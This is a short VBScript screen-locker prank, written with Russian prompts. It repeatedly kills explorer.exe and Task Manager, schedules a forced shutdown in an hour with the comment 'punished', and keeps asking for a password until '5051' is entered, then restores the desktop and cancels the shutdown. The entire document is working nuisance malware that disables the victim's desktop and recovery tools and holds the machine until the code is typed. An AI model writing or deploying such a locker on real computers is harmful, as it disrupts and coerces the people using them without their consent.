Do
set t=createobject("Wscript.Shell")
set kill = createobject("wscript.shell")
kill.run"taskkill /f /im explorer.exe"
kill.run"taskkill /f /im taskmgr.exe"
t.run"shutdown -t 3600 -s -c наказан"
password = InputBox ("Бан")
Loop Until password = "5051"
msgbox"Uspeh!",16,"Oshibka!"
t.run"explorer"
t.run"shutdown -a"